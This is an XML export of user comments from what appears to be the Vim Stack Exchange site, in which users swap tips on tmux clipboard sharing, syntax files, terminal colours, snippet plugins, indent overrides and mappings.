  <row Id="12222" PostId="7449" Score="0" Text="+clipboard is for graphical vim; it won't be relevant for running vim in a terminal. Sounds like you probably either want to copy/paste using the terminal itself, or try having your console session interface with OSX directly. There's probably a way to use pbpaste and pbcopy to do what you want if you set up a key binding; see http://stackoverflow.com/questions/5130968/how-can-i-copy-the-output-of-a-command-directly-into-my-clipboard and http://superuser.com/questions/231130/unable-to-use-pbcopy-while-in-tmux-session/413233#413233 (I'd try myself, but I don't have an OSX box)." CreationDate="2016-04-21T12:54:43.263" UserId="7203" />
  <row Id="12223" PostId="7449" Score="0" Text="@pfnuesel, yes, I want to do a `yy` command in one pane and `p` into another pane. I can't use the system clipboard because my non-gui version of vim does not have the clipboard compiled into it. I've tried many of the various solutions recommended but nothing seems to work." CreationDate="2016-04-21T13:24:24.820" UserId="2021" />
  <row Id="12224" PostId="7449" Score="0" Text="I wonder if this is the reason why I'm having trouble: https://support.apple.com/en-us/HT201341" CreationDate="2016-04-21T13:37:24.537" UserId="2021" />
  <row Id="12225" PostId="7449" Score="2" Text="It's cumbersome, but without access to the system clipboard, I think a shared file is the simplest way." CreationDate="2016-04-21T15:59:49.600" UserId="205" />
  <row Id="12226" PostId="7446" Score="2" Text="Couple of thoughts: 1. You can piggy-back on an existing cluster. Note that the `htmlTag` syntax definition includes two clusters (`@htmlPreproc`, and `@htmlArgCluster`). So you could do `:syntax cluster htmlPreproc add=quotedErubyBlock` (which makes sense in a way = the eruby part will be handled by pre-processor of sorts). Then you won't have to modify the `htmlTag` definition." CreationDate="2016-04-21T16:18:17.520" UserId="205" />
  <row Id="12227" PostId="7446" Score="1" Text="2. Use a `~/.vim/after/syntax/eruby.vim` instead of `autocmd`s. It's neater (and I suppose, more efficient, since not all HTML files need be eruby files, and you only need this when using the `eruby` syntax)." CreationDate="2016-04-21T16:19:18.693" UserId="205" />
  <row Id="12228" PostId="7457" Score="2" Text="Try the Vim from https://tuxproject.de/projects/vim/x64/" CreationDate="2016-04-21T16:20:41.693" UserId="205" />
  <row Id="12229" PostId="7457" Score="3" Text="Also, check your `_vimrc` file for a line saying something like `source $VIMRUNTIME/mswin.vim`. That file enables lots of config stuff to be MSWindows-friendly (including many mappings)." CreationDate="2016-04-21T16:34:40.750" UserId="475" />
  <row Id="12230" PostId="7457" Score="0" Text="Thanks. It isn't as effective that of the original vim in Linux. Why is that?" CreationDate="2016-04-21T16:35:52.210" UserId="7161" />
  <row Id="12231" PostId="7457" Score="1" Text="@SibiCoder I'm not sure what you mean. Except for system-specific bits, Vim behaves the same for me on Windows and Linux." CreationDate="2016-04-21T16:40:50.493" UserId="205" />
  <row Id="12232" PostId="7446" Score="1" Text="1. Good point! That's much less invasive. 2. I'm not familiar this this method, but you sound like you know what you're talking about. :P" CreationDate="2016-04-21T16:42:49.390" UserId="6489" />
  <row Id="12233" PostId="7457" Score="6" Text="I use gvim daily on Windows, both the gvim GUI and the non-graphical vim via the cmder console.  I too was frustrated until I turned off the mswin.vim config file and made a few other tweaks.  I simply deleted the _vimrc file that was installed with the program and copied my Linux .vimrc over to Windows, then went from there." CreationDate="2016-04-21T17:22:46.543" UserId="6977" />
  <row Id="12234" PostId="7449" Score="2" Text="`tmux` has a &quot;copy mode&quot;, but it's a bit awkward to use. It also has the `:set-buffer` and `:paste-buffer` commands, as well as some other related commands (see the `BUFFERS` section in `tmux(1)`). Not entirely sure how to run this from Vim (maybe something with `:bind-key -n yy ...`?) It also has the `Ms` terminfo extension to interface with the clipboard (with `:set-clipboard`)." CreationDate="2016-04-21T19:04:16.520" UserId="51" />
  <row Id="12235" PostId="7448" Score="1" Text="You shouldn't set `t_Co=256`. Instead, set `TERM=xterm-256color` (or if using `screen`/`tmux`, `TERM=screen-256color`) in your shell initialization files." CreationDate="2016-04-21T22:20:09.187" UserId="205" />
  <row Id="12237" PostId="7448" Score="0" Text="The contributor said: &quot;vim should detect this value automatically, but only if you have your terminal set up properly&quot;. Setting your terminal up properly is having `TERM=xterm-256color`. Having done that, Vim will detect that `t_Co` should be 256. It's if you have `TERM` supporting 256 colors and Vim doesn't detect it that you have to use this override." CreationDate="2016-04-22T01:53:30.160" UserId="205" />
  <row Id="12238" PostId="7448" Score="0" Text="@muru Will try that, but why shouldn't I set it as it is suggested [here](http://vim.wikia.com/wiki/256_colors_in_vim) to enable 256 colors in Vim?" CreationDate="2016-04-22T01:55:31.240" UserId="7320" />
  <row Id="12239" PostId="7448" Score="0" Text="@muru Nice, thanks for the info" CreationDate="2016-04-22T01:56:19.177" UserId="7320" />
  <row Id="12240" PostId="7459" Score="2" Text="If not a duplicate, strongly related question http://vi.stackexchange.com/q/7388/1841" CreationDate="2016-04-22T08:06:35.293" UserId="1841" />
  <row Id="12241" PostId="7461" Score="0" Text="Are you talking about omni completion? Did you tried Ctrl+x Ctrl+o (both together) when typing a c program?" CreationDate="2016-04-22T10:16:52.147" UserId="7161" />
  <row Id="12242" PostId="7461" Score="0" Text="I think you confuse vim and neovim completion methods in your post. AFAIK, you only need Shougo's 'deoplete' and 'RipRip/clang_complete' for neovim, both properly configured (I remember Shougo did write about how to configure both to work together)." CreationDate="2016-04-22T10:26:13.683" UserId="1800" />
  <row Id="12243" PostId="7461" Score="0" Text="For omni completion I get the error `Pattern not found` and with 'Rip-Rip/clang_complete' `&lt;C-x&gt;&lt;C-u&gt;` I get the error `Option 'completefunc' is not set`. I put my configuration in the post.&#xA;I can't find the post from Shougo..." CreationDate="2016-04-22T10:59:07.577" UserId="6078" />
  <row Id="12244" PostId="7441" Score="1" Text="Not what you wer looking for, but as an idea: you could go for https://github.com/majutsushi/tagbar. It'll show you where you're in the file." CreationDate="2016-04-22T11:00:56.803" UserId="6357" />
  <row Id="12246" PostId="7463" Score="5" Text="What about a snippet plugin like [ultisnips](https://github.com/sirver/UltiSnips) or [snipmate](https://github.com/garbas/vim-snipmate)?" CreationDate="2016-04-22T13:29:22.463" UserId="1841" />
  <row Id="12247" PostId="7463" Score="0" Text="@statox, I haven't found a snippet plugin that I like (e.g. something lightweight and simple). I'm also using an ancient version of Vim that wasn't compiled with python, so utlisnips is out." CreationDate="2016-04-22T14:16:43.560" UserId="3264" />
  <row Id="12248" PostId="7463" Score="1" Text="Y don't you try something like mapping or abbreviations?" CreationDate="2016-04-22T14:19:47.240" UserId="7161" />
  <row Id="12249" PostId="7464" Score="0" Text="I had same problem i just mapped &#xA;nnoremap &lt;Leader&gt;e :e &lt;C-R&gt;=expand('%:p:h') . '/'&lt;CR&gt;&#xA;To get around it" CreationDate="2016-04-22T14:47:12.200" UserId="1691" />
  <row Id="12250" PostId="7457" Score="0" Text="Make sure you have the latest version. The vim download page has two links on the same line and you want the second. I have no idea why they do this." CreationDate="2016-04-22T15:15:43.680" UserId="859" />
  <row Id="12251" PostId="7465" Score="1" Text="It's basically the same thing to what Nobe4 has but you could also consider using `iabbrev`. see `:help abbrev`" CreationDate="2016-04-22T15:22:19.423" UserId="6489" />
  <row Id="12252" PostId="7465" Score="0" Text="I'm not sure if you can change the cursor position with an abbreviation though..." CreationDate="2016-04-22T15:23:08.713" UserId="1821" />
  <row Id="12253" PostId="7465" Score="0" Text="True, but Scribblemacher didn't specifically say he needed to move cursor position did he? It all just depends on what he needs. I was just giving options. :)" CreationDate="2016-04-22T15:24:49.030" UserId="6489" />
  <row Id="12254" PostId="7465" Score="0" Text="Right, I'll add your idea for the first one" CreationDate="2016-04-22T15:25:21.590" UserId="1821" />
  <row Id="12255" PostId="7463" Score="0" Text="[mu-template](https://github.com/LucHermitte/mu-template/) may not be simple as it requires other plugins and it has many features, however, it doesn't require Python." CreationDate="2016-04-22T15:40:57.843" UserId="626" />
  <row Id="12256" PostId="7464" Score="0" Text="`:e filename` respects `autochdir` but `:e directory` starts the netrw plugin which doesn't respect `autochdir` by default. See `:help netrw` for a solution." CreationDate="2016-04-22T16:26:35.327" UserId="54" />
  <row Id="12257" PostId="7466" Score="1" Text="You also have this matrix provided on Marc Weber wiki: http://vim-wiki.mawercer.de/wiki/topic/text-snippets-skeletons-templates.html" CreationDate="2016-04-22T16:42:22.473" UserId="626" />
  <row Id="12258" PostId="7464" Score="0" Text="@romainl, interesting. Although `:help netrw` doesn't really offer a solution." CreationDate="2016-04-22T18:43:15.477" UserId="850" />
  <row Id="12260" PostId="7466" Score="1" Text="IMHO this is quite generic, perhaps if you elaborate the &quot;never been totally satisfied with it&quot;? I use Shougo's &quot;neosnippet.vim&quot;." CreationDate="2016-04-22T20:14:27.673" UserId="1800" />
  <row Id="12264" PostId="7465" Score="3" Text="With `:set showcmd` you can see a mapping as you type it, in the last line of the screen. See [`:help 'showcmd'`](http://vimhelp.appspot.com/options.txt.html#%27showcmd%27) for more information." CreationDate="2016-04-22T21:09:20.373" UserId="6698" />
  <row Id="12267" PostId="7468" Score="1" Text="That's the first time I have seen anyone mentioning abandonment as a feature. :D" CreationDate="2016-04-22T23:43:56.910" UserId="205" />
  <row Id="12268" PostId="7468" Score="0" Text="An abandoned project is a stable project. You don't need to worry about your local instance being out of date or about an update breaking your workflow with an API change. If it satisfied your needs when you installed it, it will continue to do so forever. Unless your needs change. Stability is the #1 feature I look for in *any* tool." CreationDate="2016-04-23T09:10:09.707" UserId="54" />
  <row Id="12269" PostId="2407" Score="0" Text="Why do I need `''` for `!_compile` other than other arguments?" CreationDate="2016-04-23T11:09:18.167" UserId="7366" />
  <row Id="12270" PostId="2407" Score="1" Text="`:execute`'s arguments are VimScript expressions that should evaluate to strings. If you pass multiple arguments, they will be joined with spaces. Since the first argument is just a literal string, we enclose it in quotes." CreationDate="2016-04-23T11:18:27.003" UserId="64" />
  <row Id="12271" PostId="2407" Score="0" Text="Thanks, now I'm clear. :)" CreationDate="2016-04-23T11:22:54.530" UserId="7366" />
  <row Id="12272" PostId="7475" Score="2" Text="Nothing happens in an *inactive* window so there's no reason for the status line of an inactive window to change." CreationDate="2016-04-23T14:04:06.407" UserId="54" />
  <row Id="12274" PostId="7476" Score="0" Text="Which pattern you are going to use for such exceptional lines?" CreationDate="2016-04-24T12:29:01.087" UserId="7161" />
  <row Id="12275" PostId="7476" Score="0" Text="I have no real preference. I'm writing a document in latex which use `%` as comment.&#xA;&#xA;So far I've used to insert a single line with a single comment in the middle, which actually works fine. However, this uses a new line which I'd rather avoid." CreationDate="2016-04-24T12:52:03.943" UserId="6848" />
  <row Id="12276" PostId="7476" Score="0" Text="Then, how to identify which part should be not wrapped as mentioned here?" CreationDate="2016-04-24T12:57:18.467" UserId="7161" />
  <row Id="12277" PostId="7476" Score="0" Text="I could use two spaces at the end of a line to instruct vim I want this line to be split exactly there. But I don't really have a preference, that is, I could also use a comment `%` at the end of a line where I want a break." CreationDate="2016-04-24T13:05:53.510" UserId="6848" />
  <row Id="12278" PostId="7477" Score="0" Text="Thanks, exactly what I was looking for, I'm going to try it right away." CreationDate="2016-04-24T13:08:38.210" UserId="6848" />
  <row Id="12279" PostId="5277" Score="0" Text="This is the better way. The other way is easily broken if filenames have spaces, or special characters in them." CreationDate="2016-04-24T18:00:17.063" UserId="205" />
  <row Id="12280" PostId="7480" Score="0" Text="Could you give us a workable example?" CreationDate="2016-04-24T19:35:20.107" UserId="54" />
  <row Id="12281" PostId="7480" Score="0" Text="@romainl, yes, sorry if I was unclear." CreationDate="2016-04-24T20:16:07.203" UserId="4505" />
  <row Id="12282" PostId="7481" Score="5" Text="What's the output of `:scriptnames` when you run `vim` normally?" CreationDate="2016-04-24T20:43:27.740" UserId="205" />
  <row Id="12283" PostId="7475" Score="0" Text="@romainl true, but things might happen outside: a git repo might no longer have modifications, a file might have been changed externally, etc." CreationDate="2016-04-25T01:21:24.087" UserId="205" />
  <row Id="12284" PostId="7475" Score="0" Text="@muru, all things that have nothing to do with the status of the current window/buffer." CreationDate="2016-04-25T05:22:18.387" UserId="54" />
  <row Id="12285" PostId="7486" Score="4" Text="Use the plugin's issue tracker." CreationDate="2016-04-25T05:23:15.597" UserId="54" />
  <row Id="12286" PostId="7475" Score="0" Text="@romainl so? The inactive window can have status lines." CreationDate="2016-04-25T05:23:22.083" UserId="205" />
  <row Id="12287" PostId="7488" Score="0" Text="Oh, that I know. KeepView is just a function that decorates any other function with winsaveview() and winrestview()." CreationDate="2016-04-25T07:34:40.933" UserId="6634" />
  <row Id="12288" PostId="7488" Score="0" Text="So… why ask the question if you already know the answer?" CreationDate="2016-04-25T07:57:30.407" UserId="54" />
  <row Id="12289" PostId="7488" Score="1" Text="I want to know exactly why this is happening, because I don't see any reasonable explanation." CreationDate="2016-04-25T08:42:27.150" UserId="6634" />
  <row Id="12290" PostId="7488" Score="3" Text="That's the question you added, not the original question. Anyway, ex commands leave the cursor on the last &quot;item&quot; concerned by the command (line, buffer, window, tab page…). That means that you need to somehow record the current position if you want to come back afterward." CreationDate="2016-04-25T09:19:35.050" UserId="54" />
  <row Id="12291" PostId="7481" Score="0" Text="&quot;I am the root on the machine&quot; -&gt; https://www.youtube.com/watch?v=7HG2w0_WyOU" CreationDate="2016-04-25T10:16:17.157" UserId="1800" />
  <row Id="12292" PostId="7489" Score="3" Text="I'm voting to close this question as off-topic because it would be better on Unix &amp; Linux." CreationDate="2016-04-25T10:40:38.253" UserDisplayName="Blrfl" />
  <row Id="12293" PostId="7484" Score="1" Text="there is also the &quot;:redrawstatus&quot; command." CreationDate="2016-04-25T13:35:15.467" UserId="71" />
  <row Id="12294" PostId="7466" Score="0" Text="you should update the wiki with the information from here. thanks." CreationDate="2016-04-25T13:38:08.983" UserId="71" />
  <row Id="12295" PostId="7464" Score="0" Text="@romainl, by the way, how is it that before Ubuntu 16.04 I never had this problem, even though I was still using vim 7.4?" CreationDate="2016-04-25T14:14:26.067" UserId="850" />
  <row Id="12296" PostId="7464" Score="0" Text="@romainl please see my edit. The issue seems to be deeper than that." CreationDate="2016-04-25T14:17:56.257" UserId="850" />
  <row Id="12297" PostId="7489" Score="1" Text="You could probably save a session, then source your files. To restore previous settings, close vim and restart, loading the session." CreationDate="2016-04-25T18:24:21.940" UserId="1800" />
  <row Id="12298" PostId="7492" Score="2" Text="What does your `.vimrc` look like? please post" CreationDate="2016-04-26T00:02:14.967" UserId="7254" />
  <row Id="12300" PostId="7492" Score="1" Text="Oh right I've just edited" CreationDate="2016-04-26T01:48:43.100" UserId="7399" />
  <row Id="12301" PostId="7492" Score="0" Text="&quot;I've attempted to install autoclose my placing the autoclose.vim file in it's own directory in bundle&quot; How does it look like?" CreationDate="2016-04-26T05:51:18.263" UserId="54" />
  <row Id="12302" PostId="7466" Score="0" Text="@ChristianBrabandt: Yep as soon as I'll have some time (in the next few days) I'll update it." CreationDate="2016-04-26T07:32:06.650" UserId="1841" />
  <row Id="12303" PostId="7494" Score="0" Text="I think it will be more confusing than keeping the default settings. I switched back to the default `;`, `:`, `,` mapping and I have other mappings for quick access to the command line. Otherwise you should be able to sort this with a function that keep track of your current &quot;status&quot; (searching/not searching)." CreationDate="2016-04-26T08:13:14.970" UserId="1821" />
  <row Id="12304" PostId="7502" Score="0" Text="Thanks, that's exactly what I was looking for." CreationDate="2016-04-26T09:42:08.497" UserId="7404" />
  <row Id="12305" PostId="7503" Score="1" Text="I just tried the plugin with `:syntax off` and it worked as expected, must be something elsewhere interfering. Thank you!" CreationDate="2016-04-26T09:45:32.827" UserId="5141" />
  <row Id="12306" PostId="7501" Score="1" Text="In this particular case, you don't need to use the blockwise selection. Thus you can do the following sequence: `vG:norm! A,^]I+` (where `^]` is the escape character as explained by @Nobe4)." CreationDate="2016-04-26T11:15:38.197" UserId="21" />
  <row Id="12307" PostId="7502" Score="5" Text="You should use `norm!` instead of `norm`, in order to use standard mappings instead of user defined mappings (if there are conflicts)." CreationDate="2016-04-26T11:16:25.620" UserId="21" />
  <row Id="12308" PostId="7494" Score="0" Text="What mappings do you use?" CreationDate="2016-04-26T11:38:58.910" UserId="6634" />
  <row Id="12309" PostId="7494" Score="0" Text="I do use `&lt;leader&gt;w` to save, `&lt;leader&gt;q` to quit, `&lt;leader&gt;o` to open the command line for search file (was previoulsy mapped to `ctrlp`). I don't use a lot of mapping, I tend to prefer using command." CreationDate="2016-04-26T12:25:14.513" UserId="1821" />
  <row Id="12310" PostId="7494" Score="0" Text="You could make some crazy script where they undo the remap after a search until you do some sequence to &quot;escape&quot; your search mode. But that sounds more like a problem than just leaving the two keys where they are or just pressing shift when doing your search." CreationDate="2016-04-26T13:28:02.443" UserId="895" />
  <row Id="12311" PostId="7504" Score="0" Text="why do you want your `n` to do anything else? I think you need to search again for `/,/` before using `n`" CreationDate="2016-04-26T13:57:54.103" UserId="1821" />
  <row Id="12312" PostId="7504" Score="0" Text="@Nobe4 Because I want to say on the same line and select to the next `,`" CreationDate="2016-04-26T13:59:22.463" UserId="1065" />
  <row Id="12313" PostId="7504" Score="0" Text="I'm not sure I understand, do you want to **stay** on the same line ?" CreationDate="2016-04-26T14:01:44.017" UserId="1821" />
  <row Id="12314" PostId="7504" Score="0" Text="@Nobe4 Yes, I'm in a CSV and trying to switch to visual mode and select from the character I'm at to the next matched `,` in the line." CreationDate="2016-04-26T14:06:04.530" UserId="1065" />
  <row Id="12315" PostId="7504" Score="4" Text="@leeand00 I think you confused `n`  which allows to repeat the last search made via `/` and `;` which allows to repeat the last `f` movement." CreationDate="2016-04-26T14:06:05.817" UserId="1841" />
  <row Id="12316" PostId="7504" Score="0" Text="@Nobe4 Yup I didn't know they were different.  Thank you.  Post the answer and I'll accept it." CreationDate="2016-04-26T14:07:34.490" UserId="1065" />
  <row Id="12317" PostId="7504" Score="0" Text="Thanks, but you should thanks @statox instead ;)" CreationDate="2016-04-26T14:08:32.393" UserId="1821" />
  <row Id="12318" PostId="7504" Score="0" Text="Well tell him to post then...@statox post your answer!" CreationDate="2016-04-26T14:10:58.527" UserId="1065" />
  <row Id="12319" PostId="7507" Score="2" Text="Thanks! This works exactly as I had hoped. Thanks for the decomposition, it's extremely helpful" CreationDate="2016-04-26T15:47:34.763" UserId="7405" />
  <row Id="12320" PostId="7509" Score="0" Text="Nice, do you see any practical use of your version instead of the &quot;simple&quot; one ? (performance/reusability/...)" CreationDate="2016-04-26T15:55:22.440" UserId="1821" />
  <row Id="12321" PostId="3794" Score="0" Text="I'm having the same problem.  doing &quot;set textwidth?&quot; I get &quot;textwidth=0&quot; and doing &quot;set wrap?&quot; i get &quot;wrap&quot;.  changing textwidth to 80 doesn't help." CreationDate="2016-04-26T16:05:02.877" UserId="7408" />
  <row Id="12323" PostId="7468" Score="1" Text="&quot;If it satisfied your needs when you installed it, it will continue to do so forever. Unless your needs change.&quot;  Or you find a bug, at which point you need to fix it yourself, find someone else to fix it, or look for an alternative; one which hasn't been abandoned, perhaps." CreationDate="2016-04-26T16:30:00.263" UserId="859" />
  <row Id="12324" PostId="7492" Score="0" Text="In the vim directory there are two directories. Autoload and bundle. In bundle I have three directories. Autoclose, nerdtree and vim-airline (the latter two work fine). In the autoclose bundle I have the file autoclose.vim" CreationDate="2016-04-26T17:05:31.050" UserId="7399" />
  <row Id="12325" PostId="7509" Score="1" Text="Using vimscript probably makes it a bit faster but by a small margin if any. Other than that, it's just for fun." CreationDate="2016-04-26T19:12:35.883" UserId="54" />
  <row Id="12326" PostId="7516" Score="3" Text="I would use the expression `col('.') &gt; indent('.') ? '^' : '0'`. This simplifies things a little, and it will now go to the beginning also when the column is between the beginning of the line and the first non-whitespace character." CreationDate="2016-04-27T06:32:18.033" UserId="21" />
  <row Id="12327" PostId="7515" Score="5" Text="The default file explorer is indeed buggy (and from what I've read it has more or less always been). Tim pope wrote the [vinegar](https://github.com/tpope/vim-vinegar) plugin to improve it a little bit but it's still not perfect (I'm really not sure it would solve your problems). About Nerdtree, I used it, but it also have some annoying bugs (some buffers which doesn't close when they should and this kind of stuff). I would recommend to get used to functions like `:find`, `:e`, `:buffers` to get ride of file explorers. Some will also advise to use fuzzy finders (but I'm not of these ones)." CreationDate="2016-04-27T07:25:15.880" UserId="1841" />
  <row Id="12328" PostId="7514" Score="2" Text="The `H` part of your question is completely irrelevant and `H` is a pretty useful command so it's not really a good idea to advocate remapping it to something as futile. I suggest replacing everywhere with &quot;some shortcut&quot;." CreationDate="2016-04-27T08:37:51.943" UserId="54" />
  <row Id="12329" PostId="7516" Score="0" Text="Thanks for the tips! That one-liner definitely looks nicer. Quick followup: would there be a way to do a similar thing with L for a &quot;strong&quot; right motion for the unfortunate cases where there is trailing whitespace? Is there something similar to `indent('.')+1' that could get the column number of the last non-whitespace character?" CreationDate="2016-04-27T12:32:03.760" UserId="5043" />
  <row Id="12330" PostId="7516" Score="0" Text="@KarlYngveLervåg That's perfect, thanks for that. I like that functionality better than what I originally had." CreationDate="2016-04-27T12:32:54.527" UserId="5043" />
  <row Id="12331" PostId="7515" Score="1" Text="thanks @statox! yeah, I've spent hours disabling most of my plugins and trying different plugins in hopes that it was one of my plugins.  but it's good (and bad) to hear that it is very buggy. that's annoying and basically is turning me off of vim: I have to do a lot of code discovery in my job, which I work best by visualizing the directory tree and naming conventions of the group of files.  Hence, `:Vex` and keeping it open with about a dozen buffers in another split view (sometimes 4 splits at once in a 2x2 pattern)." CreationDate="2016-04-27T12:37:51.493" UserId="6413" />
  <row Id="12333" PostId="7514" Score="0" Text="@romainl Good point. Changed the question title." CreationDate="2016-04-27T12:39:20.497" UserId="5043" />
  <row Id="12334" PostId="7516" Score="0" Text="@KarlYngveLervåg I think it should be `col('.') &gt; indent('.')+1 ? '^' : '0'` though, right?" CreationDate="2016-04-27T12:43:25.610" UserId="5043" />
  <row Id="12335" PostId="7516" Score="0" Text="@BenLindsay Yeah, I just tested it and without `col('.') &gt; indent('.')+1` the cursor won't move any more since `^` will put the cursor in limbo.  And it looks like using `&gt;` vs `==` makes no difference, so I won't be updating the post after all.  I'll update with an example for jumping between the ends of the line, though." CreationDate="2016-04-27T12:57:20.463" UserId="5229" />
  <row Id="12336" PostId="7515" Score="1" Text="Well @eduncan911 I understand that, I also was used to the &quot;traditional file explorer view&quot; with your directory and your files but really it is just a question of habit: I got used to navigate in my file in another way and now it's just not a problem anymore (Still I've been using Nerdtree for something like a year so it took time to make the change). In my opinion Vim provides a many useful and efficient features that it is worth getting used to another way to browse your files :-)" CreationDate="2016-04-27T13:05:31.137" UserId="1841" />
  <row Id="12337" PostId="7515" Score="0" Text="Also I think this is a relevant article: [Oil and vinegar - split windows and the project drawer ](http://vimcasts.org/blog/2013/01/oil-and-vinegar-split-windows-and-project-drawer/)" CreationDate="2016-04-27T13:07:21.837" UserId="1841" />
  <row Id="12338" PostId="7516" Score="2" Text="@TommyA The `&gt;` does make a difference compared to `==` in the case where the cursor is between column 0 and the first whitespace character. It makes the cursor go left instead of right in that case. Thanks for adding the L mapping! I added that to my `.vimrc` too. I wish I could upvote you again." CreationDate="2016-04-27T13:55:22.673" UserId="5043" />
  <row Id="12339" PostId="7519" Score="2" Text="http://stackoverflow.com/questions/36716644/how-to-change-gvim-titlestring/36717214#36717214" CreationDate="2016-04-27T19:47:59.603" UserId="1569" />
  <row Id="12340" PostId="7481" Score="0" Text="@muru thanks for the comment -- see **EDIT2**" CreationDate="2016-04-27T21:14:44.610" UserId="7380" />
  <row Id="12341" PostId="7512" Score="0" Text="Thanks -- see **EDIT1**" CreationDate="2016-04-27T21:15:16.363" UserId="7380" />
  <row Id="12342" PostId="7481" Score="2" Text="You probably need to use a `~/.vim/after/indent.vim` or `~/.vim/after/indent/foo.vim` if you want to override those." CreationDate="2016-04-27T21:16:26.357" UserId="205" />
  <row Id="12343" PostId="585" Score="0" Text="off-topic... @muru if you like the movies, you should check out the show!" CreationDate="2016-04-27T21:32:32.253" UserId="67" />
  <row Id="12344" PostId="7524" Score="3" Text="Something like `:%s/return \(\i*\);/return verify(\1);/`?" CreationDate="2016-04-27T21:43:17.480" UserId="205" />
  <row Id="12345" PostId="7525" Score="0" Text="Thank you so much!" CreationDate="2016-04-27T21:47:01.187" UserId="7409" />
  <row Id="12346" PostId="7525" Score="0" Text="You are welcome!" CreationDate="2016-04-27T21:47:30.173" UserId="54" />
  <row Id="12347" PostId="7481" Score="0" Text="Thanks again @muru.  Some progress, but vim doesn't seem to take `~/.vim/after/indent/foo.vim` into consideration.  I experimented with different locations under `~/.vim/after/...`, but for the most part, files therein are ignored see **EDIT 3**" CreationDate="2016-04-27T22:04:26.520" UserId="7380" />
  <row Id="12348" PostId="7481" Score="0" Text="@EdwardNewell Foo in that case was supposed to be the filetype (not an arbitrary string), so try `python.vim` if you're looking to override python indent settings." CreationDate="2016-04-27T22:11:05.530" UserId="205" />
  <row Id="12349" PostId="7524" Score="0" Text="@muru omg, that was brilliant!!" CreationDate="2016-04-27T22:18:24.580" UserId="7409" />
  <row Id="12350" PostId="7481" Score="0" Text="Ok I get it.  I had to move it to `~/.vim/after/ftplugin/python.vim`, because it turns out that my indent settings were being overridden in `/usr/share/vim/vim74/ftplugin/python.vim`  Thanks for all the help." CreationDate="2016-04-27T22:27:12.283" UserId="7380" />
  <row Id="12351" PostId="6512" Score="0" Text="you can use `verbose set conceallevel` to see which script change this option" CreationDate="2016-04-26T15:37:59.597" UserId="7407" />
  <row Id="12352" PostId="7525" Score="2" Text="@romainl Nice, +1! Just a minor suggestion, for the 2nd solution `ciwverify(&lt;C-r&gt;&quot;)&lt;Esc&gt;`. When I use it, the dot register is filled with `verify(variable1)` (assuming the word under the cursor was `variable1`). Which means that when I hit dot on a second variable, let's say `variable2`, it's replaced with `verify(variable1)` whereas I wanted `verify(variable2)`. However, if I prefix the unnamed register with `&lt;C-o&gt;` (or `&lt;C-p&gt;`), it works because then the dot register contains `verify(^R^O&quot;)`. So, to make the 2nd solution repeatable with dot, `ciwverify(&lt;C-r&gt;&lt;C-o&gt;&quot;)&lt;esc&gt;` could be used." CreationDate="2016-04-28T05:11:16.887" UserId="6960" />
  <row Id="12353" PostId="7528" Score="6" Text="Your answer if perfectly right, I just want to mention that someone did release a [clone of Vim](https://github.com/coolwanglu/vim.js) written in Javascript that you can [try online](https://coolwanglu.github.io/vim.js/emterpreter/vim.html) it is far from being as complete and functional as the original vim but that exists :-)" CreationDate="2016-04-28T05:27:08.280" UserId="1841" />
  <row Id="12354" PostId="7525" Score="0" Text="@user9433424, very good point. Let me update my answer." CreationDate="2016-04-28T05:46:14.800" UserId="54" />
  <row Id="12355" PostId="7516" Score="0" Text="Yes, you are right: The `+1` is needed. Sorry. Except for that, I think my suggestion is an improvement on @TommyA's solution." CreationDate="2016-04-28T06:25:51.000" UserId="21" />
  <row Id="12356" PostId="7527" Score="1" Text="You can try [snake](https://github.com/amoffat/snake) as an &quot;alternative&quot; to VimL. I haven't used it though so I cannot say much about it. All the VimL required is to setup your vimrc file to load the plugin. The rest is python." CreationDate="2016-04-28T07:05:35.917" UserId="20" />
  <row Id="12357" PostId="7531" Score="1" Text="instead of using `&lt;Esc&gt;ea` you can use `&lt;c-o&gt;w` :)" CreationDate="2016-04-28T07:49:06.367" UserId="1821" />
  <row Id="12358" PostId="7495" Score="1" Text="What version of Vim are you using? What does `set equalprg?` say in a buffer with a Perl file?" CreationDate="2016-04-28T07:49:39.150" UserId="7415" />
  <row Id="12359" PostId="7531" Score="0" Text="@Nobe4 here comes the vimgolf :-) Thanks for the suggestion I'll edit my answer." CreationDate="2016-04-28T07:51:40.883" UserId="1841" />
  <row Id="12360" PostId="7527" Score="0" Text="thanks man, great suggestion!" CreationDate="2016-04-28T08:26:42.543" UserId="1276" />
  <row Id="12361" PostId="7528" Score="0" Text="That's amazing, thanks man!" CreationDate="2016-04-28T08:27:59.270" UserId="1276" />
  <row Id="12362" PostId="7520" Score="0" Text="Everytime, i closed vim, i got a message like 'thanks for using vim'. I wanted to change this. I tried with :au VimLeave * set title titlestring=Mytext as well as :au BufLeave * set title titlestring=Mytext.   But when I close vim, Mytext is not set as the title. Why?" CreationDate="2016-04-28T08:35:52.670" UserId="7161" />
  <row Id="12363" PostId="7528" Score="3" Text="Beside, I'd add that VimL is extremely close to what vim offers through its command line. All vim variables, functions that can be used with `:substitute`, etc. are in VimL." CreationDate="2016-04-28T08:37:17.230" UserId="626" />
  <row Id="12364" PostId="7520" Score="0" Text="But that is not what you described in your question, is it? And I have never seen such a message when leaving Vim... You should edit your question with a clear description of your problem, a screenshot of this message and also a description of how you installed Vim because I have never heard of a version which prompted such a message" CreationDate="2016-04-28T08:53:21.137" UserId="1841" />
  <row Id="12365" PostId="7520" Score="0" Text="Thanks statox. My question is different. I read the help and tried. That works. I just wanted to know whether its possible to change when closing a file" CreationDate="2016-04-28T08:58:06.193" UserId="7161" />
  <row Id="12366" PostId="7495" Score="0" Text="Version 7.2. When I entered set equalprg, it shows equalprg= (blank)" CreationDate="2016-04-28T09:02:27.653" UserId="7161" />
  <row Id="12367" PostId="7520" Score="2" Text="Regarding your 'thanks for using vim' message, I suggest you read [`:h titleold`](http://vimdoc.sourceforge.net/htmldoc/options.html#titleold). Other wise, the comments should not be used to ask new question (but rather add details/ask for precisions on existing question). If you have another issue, please ask another question." CreationDate="2016-04-28T09:06:40.127" UserId="1821" />
  <row Id="12368" PostId="7532" Score="0" Text="The comments are aligned properly. But the lines following it are also aligned to left edge of the screen. Expected is, the following lines has to be aligned based on it's parent block" CreationDate="2016-04-28T09:57:51.577" UserId="7161" />
  <row Id="12369" PostId="7532" Score="0" Text="Ooops... I'm guilty of modifying your code (put it inside a `sub`.) How about [this version](https://raw.githubusercontent.com/vim/vim/543b7ef7000d08d77409478315d68b607bb8bad8/runtime/indent/perl.vim)? Seem to work here." CreationDate="2016-04-28T10:09:39.140" UserId="7415" />
